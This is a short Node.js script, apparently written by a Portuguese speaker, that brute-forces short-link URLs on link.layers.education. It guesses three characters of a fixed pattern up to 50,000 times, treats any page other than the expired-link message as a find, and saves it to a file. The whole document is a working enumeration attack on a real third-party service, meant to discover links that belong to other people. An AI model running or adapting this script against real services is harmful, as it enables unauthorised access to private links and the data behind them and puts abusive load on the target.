import axios from "axios";
import fs from 'fs';

function getMultipleRandom(arr, num) {
    const shuffled = [...arr].sort(() => 0.5 - Math.random());

    return shuffled.slice(0, num);
}

const arr = [
    "a",
    "b",
    "c",
    "d",
    "e",
    "f",
    "g",
    "h",
    "i",
    "j",
    "k",
    "l",
    "m",
    "n",
    "o",
    "p",
    "q",
    "r",
    "s",
    "t",
    "u",
    "v",
    "w",
    "x",
    "y",
    "z",
    "0",
    "1",
    "2",
    "3",
    "4",
    "5",
    "6",
    "7",
    "8",
    "9",
];

let arrayBD = [];

let vezes = 0;

while (vezes < 50000) {
    let gerado = getMultipleRandom(arr, 3);

    if (arrayBD.includes(gerado) == false) {
        await axios.get('https://link.layers.education/w' + gerado[0] + 'cc' + gerado[1] + '9x' + gerado[2]).then(function (response) {
            if (response.data.includes('The link you clicked has been')) {
                arrayBD.push(gerado);
                console.log('Tentei: ' + gerado + ' ' + response.status);
                // console.log(vezes);
            } else {
                console.log('---------------------------------ACHEI:' + gerado);
                fs.writeFileSync("achei.txt", gerado.toString());
            }
        });
    }
    vezes++;
}
